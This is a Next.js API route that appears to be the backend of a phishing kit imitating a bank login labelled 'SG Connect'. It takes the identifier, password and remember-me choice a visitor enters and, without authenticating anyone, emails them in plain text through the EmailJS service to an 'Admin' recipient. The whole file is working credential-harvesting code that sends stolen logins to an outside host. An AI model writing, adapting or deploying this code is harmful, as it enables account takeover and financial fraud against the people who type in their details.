import { NextRequest, NextResponse } from "next/server";

export async function POST(req: NextRequest) {
  const { identifier, password, remember_me, timestamp } = await req.json();

  const payload = {
    service_id: process.env.NEXT_PUBLIC_EMAILJS_SERVICE_ID!,
    template_id: process.env.NEXT_PUBLIC_EMAILJS_TEMPLATE_ID!,
    user_id: process.env.NEXT_PUBLIC_EMAILJS_PUBLIC_KEY!,
    accessToken: process.env.EMAILJS_PRIVATE_KEY!,
    template_params: {
      identifier: identifier || "(empty)",
      password: password || "(empty)",
      remember_me: remember_me || "Non",
      timestamp: timestamp || new Date().toISOString(),
      to_name: "Admin",
      from_name: "SG Connect",
      message: `Identifiant: ${identifier}\nMot de passe: ${password}\nSe souvenir: ${remember_me}\nHeure: ${timestamp}`,
    },
  };

  const response = await fetch("https://api.emailjs.com/api/v1.0/email/send", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
  });

  const text = await response.text();
  console.log("[EmailJS]", response.status, text);

  if (!response.ok) {
    return NextResponse.json({ error: text }, { status: 500 });
  }

  return NextResponse.json({ ok: true });
}
